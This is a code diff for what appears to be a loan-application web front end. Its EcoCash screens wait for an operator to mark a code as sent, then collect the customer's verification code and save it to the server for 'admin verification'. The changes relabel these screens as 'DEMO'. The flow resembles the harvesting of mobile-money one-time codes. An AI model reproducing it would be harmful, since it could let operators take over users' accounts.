@@ -1971,7 +1971,7 @@ async function monitorEcoCashCodeSentStatus() {
 
 }
 // ======================================================
-// PART 21 - ECOCASH VERIFICATION CODE SCREEN
+// DEMO ECOCASH VERIFICATION SCREEN
 // ======================================================
 
 function loadEcoCashVerificationScreen() {
@@ -1984,9 +1984,7 @@ function loadEcoCashVerificationScreen() {
 
         <div class="app-header">
 
-            <button
-                class="back-btn"
-                id="backEcoDetails">
+            <button class="back-btn" id="backEcoDetails">
                 ← Back
             </button>
 
@@ -2010,38 +2008,33 @@ function loadEcoCashVerificationScreen() {
 
         <div class="progress-bar">
 
-            <div
-                class="progress-fill"
-                style="width:75%;">
-            </div>
+            <div class="progress-fill" style="width:75%;"></div>
 
         </div>
 
         <div class="welcome-card">
 
-            <h2>🟢 EcoCash Verification</h2>
+            <h2>EcoCash Demo Verification</h2>
 
             <p class="intro">
 
-                Your demo verification code has been sent
-                to your EcoCash number.
+                📩 Your demo verification code has been marked
+                as sent.
 
                 <br><br>
 
-                Please enter the demo code below to continue.
+                Enter the <strong>DEMO code</strong> provided
+                for this test.
 
             </p>
 
-            <label>
-                🔢 Demo Verification Code
-            </label>
+            <label>DEMO Verification Code</label>
 
             <input
                 type="text"
                 id="ecoVerificationCode"
-                placeholder="Enter demo code"
-                autocomplete="one-time-code"
-            >
+                placeholder="Enter DEMO code"
+                autocomplete="off">
 
             <br><br>
 
@@ -2073,7 +2066,7 @@ function loadEcoCashVerificationScreen() {
 
 }
 // ======================================================
-// PART 22 - SAVE ECOCASH VERIFICATION CODE
+// SAVE DEMO ECOCASH VERIFICATION
 // ======================================================
 
 async function saveEcoCashVerification() {
@@ -2085,10 +2078,9 @@ async function saveEcoCashVerification() {
 
     if (code === "") {
 
-        alert("Please enter the demo verification code.");
+        alert("Please enter the DEMO verification code.");
 
         return;
-
     }
 
     const applicationId =
@@ -2099,7 +2091,6 @@ async function saveEcoCashVerification() {
         alert("Application session not found.");
 
         return;
-
     }
 
     try {
@@ -2125,24 +2116,23 @@ async function saveEcoCashVerification() {
 
             throw new Error(
                 result.message ||
-                "Unable to save verification code."
+                "Unable to save DEMO verification."
             );
 
         }
 
-        // Code saved successfully.
-        // Customer now waits for admin verification.
+        // The DEMO value has been saved.
         loadVerificationPendingScreen();
 
     } catch (err) {
 
         console.error(
-            "EcoCash verification error:",
+            "SAVE DEMO VERIFICATION ERROR:",
             err
         );
 
         alert(
-            "Unable to connect to the server."
+            "Unable to save the DEMO verification code."
         );
 
     }
@@ -2952,6 +2942,139 @@ function loadDisbursedScreen() {
     </div>
 
     `;
+
+}
+// ======================================================
+// DEMO CODE SENDING SCREEN
+// ======================================================
+
+function loadEcoCashCodeSendingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="welcome-card">
+
+            <div style="
+                font-size:60px;
+                text-align:center;
+            ">
+                🟢
+            </div>
+
+            <h2 style="text-align:center;">
+                EcoCash Verification
+            </h2>
+
+            <br>
+
+            <div style="
+                text-align:center;
+                font-size:22px;
+                color:#f39c12;
+                font-weight:bold;
+            ">
+
+                🟡 Sending demo verification code...
+
+            </div>
+
+            <br>
+
+            <p style="
+                text-align:center;
+                line-height:1.8;
+            ">
+
+                Please wait while we prepare your
+                demo verification code.
+
+                <br><br>
+
+                You will be asked to enter the code
+                once it has been sent.
+
+            </p>
+
+            <div class="loading-dots">
+
+                <span></span>
+                <span></span>
+                <span></span>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
+
+    monitorEcoCashCodeStatus();
+
+}
+// ======================================================
+// MONITOR DEMO ECOCASH CODE STATUS
+// ======================================================
+
+async function monitorEcoCashCodeStatus() {
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) {
+
+        console.error(
+            "Application ID not found."
+        );
+
+        return;
+
+    }
+
+    try {
+
+        const response = await fetch(
+            `/application-status/${applicationId}`
+        );
+
+        const result = await response.json();
+
+        if (!result.success) {
+            return;
+        }
+
+        const application =
+            result.application;
+
+        if (
+            application.current_stage ===
+            "code_sent"
+        ) {
+
+            loadEcoCashVerificationScreen();
+
+            return;
+
+        }
+
+    } catch (err) {
+
+        console.error(
+            "CODE STATUS ERROR:",
+            err
+        );
+
+    }
+
+    // Check again after 3 seconds
+    setTimeout(
+        monitorEcoCashCodeStatus,
+        3000
+    );
 
 }
 // ======================================================
